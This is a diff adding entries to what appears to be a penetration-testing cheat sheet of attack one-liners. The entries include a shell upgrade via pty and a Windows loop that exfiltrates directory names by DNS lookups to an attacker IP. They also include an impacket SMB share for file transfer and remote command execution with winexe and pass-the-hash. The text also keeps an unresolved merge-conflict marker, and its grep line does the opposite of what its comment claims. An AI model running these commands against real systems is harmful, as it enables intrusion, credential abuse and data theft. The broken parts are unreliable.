@@ -19,10 +19,22 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 #Download all files from ftp server
 wget -m --no-passive ftp://username:password@<FTP IP>
 
+#Cat file without comments and output lines with content ONLY
+cat file.txt | grep -x ^\# | grep .
+
 #Windows
 
 #Basic DNS Tunneling
 for /F %i in ('dir /B C:\') do nslookup %i.com <your_ip>
+
+#SMB Share (powershell)
+In Kali -> impacket-smbserver name `pwd`
+In Windows -> New-PSDrive -Name "whatever" -PSProvider "FileSystem" -Root "\\<IP>\smbshare-name"
+
+
+#Remote execution with credentials
+1) winexe -U hostname/administrator //<ip> cmd.exe
+2) pth-winexe -U hostname/administrator //<ip> cmd.exe
 
 <<<<<<< HEAD
 #File downloads
